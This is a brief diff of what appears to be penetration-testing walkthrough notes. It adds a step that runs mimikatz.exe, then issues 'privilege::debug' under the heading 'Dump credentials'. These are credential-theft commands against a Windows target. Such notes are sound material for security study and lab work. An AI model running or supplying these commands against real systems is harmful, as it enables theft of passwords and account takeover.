@@ -6,6 +6,9 @@ Transfer mimikatz to target.
 # Step 3:
 Dump credentials.
 ```
+.\mimikatz.exe
+```
+```
 privilege::debug
 ```
 ```
